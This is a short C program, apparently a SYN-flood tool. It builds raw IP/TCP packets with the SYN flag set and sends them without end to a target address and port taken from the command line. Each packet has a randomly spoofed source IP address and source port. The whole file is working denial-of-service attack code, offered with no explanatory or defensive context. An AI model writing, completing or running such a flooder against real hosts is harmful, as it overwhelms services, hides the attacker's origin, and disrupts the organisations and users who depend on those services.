#include <sys/socket.h>
#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <stdlib.h>
#include <string.h>

//#define DESTPORT 80
#define LOCALPORT 8888

void send_tcp(int sockfd, struct sockaddr_in *addr);
//unsigned short check_sum(unsigned short *addr, int len);

int main (int argc, char **argv)
{
    int sockfd;
    struct sockaddr_in addr;
    int on = 1;
    
    if (3 != argc)
    {
        printf("param error \n");
        exit(1);
    }
    
    unsigned int nDestPort = atoi(argv[2]);
    
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (0 > sockfd)
    {
        perror("socket error");
        exit(1);
    }  
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(nDestPort);
    inet_aton(argv[1], &addr.sin_addr);
    
    setuid(getuid());
    send_tcp(sockfd, &addr);
    
    return 0;
}

void send_tcp(int sockfd, struct sockaddr_in *addr)
{
    char buffer[100] = {0};
    struct ip *ip;
    struct tcphdr *tcp;
    int head_len;
    head_len = sizeof(struct ip) + sizeof(struct tcphdr);
    
    ip = (struct ip *)buffer;
    ip->ip_v = IPVERSION;
    ip->ip_hl = sizeof(struct ip) >> 2;
    ip->ip_tos = 0;
    ip->ip_len = htons(head_len);
    ip->ip_id = 0;
    ip->ip_off = 0;
    ip->ip_ttl = MAXTTL;
    ip->ip_p = IPPROTO_TCP;
    ip->ip_sum = 0;
    ip->ip_dst = addr->sin_addr;
    
    //printf("dest address is %s \n", inet_ntoa(addr->sin_addr));
    
    tcp = (struct tcphdr *)(buffer + sizeof(struct ip));
    tcp->source = htons(LOCALPORT);
    tcp->dest = addr->sin_port;
    tcp->seq = random();
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->check = 0;
    
    while (1)
    {
        ip->ip_src.s_addr = random();
        int nRand = rand();
        nRand = nRand < 0 ? 0 - nRand : nRand;
        unsigned int srcPort = nRand % 65534;
        srcPort = srcPort == 0 ? 8088 : srcPort;
        tcp->source = htons(srcPort);
        sendto(sockfd, buffer, head_len, 0, (struct sockaddr *)addr, sizeof(struct sockaddr));
    }
    
}